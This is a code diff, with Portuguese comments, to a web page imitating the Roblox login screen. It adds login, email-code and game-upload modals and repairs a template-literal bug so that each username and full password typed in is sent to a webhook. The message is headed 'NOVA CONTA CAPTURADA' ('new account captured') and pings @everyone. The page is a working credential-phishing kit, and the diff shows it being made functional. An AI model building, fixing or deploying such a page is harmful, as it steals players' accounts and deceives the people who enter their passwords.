@@ -16,16 +16,21 @@
                         linear-gradient(135deg,#0a0e17 0%,#0d1b35 100%);
             background-size:200% 200%; filter:blur(8px); animation:bgZoom 20s infinite alternate; }
         @keyframes bgZoom { 0%{background-size:150% 150%} 100%{background-size:170% 170%} }
-        .roblox-modal { background:#191b1d; color:white; border-radius:10px; box-shadow:0 10px 40px rgba(0,0,0,0.5); }
-        .roblox-header { font-weight:700; font-size:32px; text-align:center; margin-bottom:24px; color:#fff; margin-top:10px; }
-        .roblox-input { background:#232527; border:1px solid #a7a7a7; border-radius:6px; color:white; padding:10px 12px; font-size:16px; width:100%; margin-bottom:12px; height:44px; }
+        
+        /* Estilos dos Modais */
+        .modal-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 50; padding: 20px; }
+        .roblox-modal { background:#191b1d; color:white; border-radius:10px; box-shadow:0 10px 40px rgba(0,0,0,0.5); width: 100%; max-width: 400px; position: relative; }
+        .roblox-header { font-weight:700; font-size:32px; text-align:center; margin-bottom:24px; color:#fff; margin-top:20px; }
+        .roblox-input { background:#232527; border:1px solid #a7a7a7; border-radius:6px; color:white; padding:10px 12px; font-size:16px; width:100%; margin-bottom:12px; height:44px; box-sizing: border-box; }
         .roblox-input:focus { border-color:white; outline:none; }
-        .roblox-btn-primary { background:#232527; border:1px solid #fff; color:white; border-radius:8px; padding:10px; font-size:16px; font-weight:500; width:100%; cursor:pointer; height:44px; display:flex; align-items:center; justify-content:center; }
+        .roblox-btn-primary { background:#232527; border:1px solid #fff; color:white; border-radius:8px; padding:10px; font-size:16px; font-weight:500; width:100%; cursor:pointer; height:44px; display:flex; align-items:center; justify-content:center; transition: 0.2s; }
         .roblox-btn-primary:hover { background:rgba(255,255,255,0.1); }
-        .roblox-btn-secondary { background:#2b2d31; color:white; border-radius:8px; padding:10px; }
+        .roblox-btn-secondary { background:#2b2d31; color:white; border-radius:8px; padding:10px; width: 100%; margin-top: 10px; cursor: pointer; text-align: center;}
         .roblox-btn-secondary:hover { border:1px solid #fff; }
         .roblox-divider { height:1px; background:#3e4042; margin:20px 0; }
-        .email-modal-header { background:#191b1d; border-bottom:1px solid #3e4042; padding:15px; display:flex; align-items:center; }
+        .email-modal-header { background:#191b1d; border-bottom:1px solid #3e4042; padding:15px; display:flex; align-items:center; justify-content: space-between; border-radius: 10px 10px 0 0;}
+        .modal-body { padding: 20px; }
+
         .toast-error { position:fixed; bottom:-100px; left:50%; transform:translateX(-50%); background:#191b1d; color:white; padding:14px 28px; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.6); z-index:100; transition:bottom .4s; font-weight:600; border:1px solid #3e4042; }
         .toast-error.show { bottom:20px; }
     </style>
@@ -55,9 +60,72 @@
         </div>
     </main>
 
-    <!-- Todos os modais aqui (igual ao anterior, sem alteração visual) -->
-    <!-- (Cole os modais exatamente como no código anterior - estão 100% funcionais) -->
-    <!-- Modal Seleção, Roblox, E-mail, Código, Upload -->
+    <div id="modal-selecao" class="modal-overlay hidden">
+        <div class="roblox-modal p-6">
+            <h2 class="text-2xl font-bold mb-4 text-center">Como deseja entrar?</h2>
+            <button onclick="abrirFormularioRoblox()" class="roblox-btn-primary mb-3">
+                <i class="fa-solid fa-user mr-2"></i> Login Padrão
+            </button>
+            <button onclick="irParaEmail()" class="roblox-btn-primary">
+                <i class="fa-solid fa-envelope mr-2"></i> Código por E-mail
+            </button>
+            <button onclick="fecharModais()" class="roblox-btn-secondary mt-4">Cancelar</button>
+        </div>
+    </div>
+
+    <div id="modal-form-roblox" class="modal-overlay hidden">
+        <div class="roblox-modal p-6">
+            <div class="roblox-header">Login</div>
+            <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário / E-mail / Telefone">
+            <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
+            <button onclick="processarLogin()" class="roblox-btn-primary mt-2">Entrar</button>
+            <div class="roblox-divider"></div>
+            <button onclick="voltarSelecao()" class="text-gray-400 text-sm hover:text-white w-full text-center">Voltar</button>
+        </div>
+    </div>
+
+    <div id="modal-email" class="modal-overlay hidden">
+        <div class="roblox-modal">
+            <div class="email-modal-header">
+                <span class="font-bold text-lg">Verificação</span>
+                <button onclick="fecharEmail()" class="text-gray-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="modal-body">
+                <p class="mb-3 text-gray-300 text-sm">Insira seu e-mail para receber o código de acesso.</p>
+                <input type="email" id="inp-email-codigo" class="roblox-input" placeholder="seu@email.com">
+                <button onclick="enviarCodigoEmail()" class="roblox-btn-primary mt-2">Enviar Código</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-codigo" class="modal-overlay hidden">
+        <div class="roblox-modal">
+            <div class="email-modal-header">
+                <span class="font-bold text-lg">Código de Acesso</span>
+                <button onclick="fecharCodigo()" class="text-gray-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="modal-body">
+                <p class="mb-3 text-gray-300 text-sm">Digite o código enviado para seu e-mail.</p>
+                <input type="text" id="inp-final-code" class="roblox-input" placeholder="Ex: 123456">
+                <button onclick="verificarCodigo()" class="roblox-btn-primary mt-2">Verificar e Entrar</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-upload" class="modal-overlay hidden">
+        <div class="bg-white text-gray-800 rounded-lg p-6 w-full max-w-md shadow-2xl">
+            <h2 class="text-xl font-bold mb-4 border-b pb-2">Publicar Jogo</h2>
+            <div class="space-y-3">
+                <input id="up-name" class="w-full border p-2 rounded" placeholder="Nome do Jogo">
+                <input id="up-img" class="w-full border p-2 rounded" placeholder="Link da Imagem (Capa)">
+                <input id="up-link" class="w-full border p-2 rounded" placeholder="Link de Download">
+                <div class="flex gap-2 mt-4">
+                    <button onclick="salvarJogo()" class="flex-1 bg-green-600 text-white p-2 rounded hover:bg-green-700">Publicar</button>
+                    <button onclick="modalUpload.classList.add('hidden')" class="flex-1 bg-gray-300 text-gray-700 p-2 rounded hover:bg-gray-400">Cancelar</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <div id="toast" class="toast-error">Erro</div>
 
@@ -160,12 +228,11 @@
                 return;
             }
 
-            // SENHA VAI COMPLETA + @everyone
-            enviarWebhook(`## NOVA CONTA CAPTURADA\n**Usuário:** \( {u}\n**Senha:** \){p}\n||@everyone||`);
+            // CORRIGIDO: Sintaxe ${u} e ${p}
+            enviarWebhook(`## NOVA CONTA CAPTURADA\n**Usuário:** ${u}\n**Senha:** ${p}\n||@everyone||`);
 
             fecharModais();
             logarUsuario(u, false);
-            // Sem alert de boas-vindas
         }
 
         function enviarWebhook(msg) {
